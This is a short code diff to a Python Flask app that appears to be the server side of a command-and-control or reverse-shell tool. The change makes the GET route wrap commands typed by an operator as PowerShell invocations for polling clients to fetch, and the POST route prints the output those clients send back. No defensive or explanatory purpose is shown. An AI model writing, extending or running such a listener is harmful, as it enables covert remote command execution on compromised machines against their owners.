@@ -41,7 +41,9 @@ def log(log):
 @app.route('/', methods=['GET'])
 def get():
     cmd=input('~ $ ')
-    return cmd
+    ps = f"powershell {cmd}"
+    return ps
+
 @app.route('/', methods=['POST'])
 def post():
     print(request.get_data().decode('utf-8'))
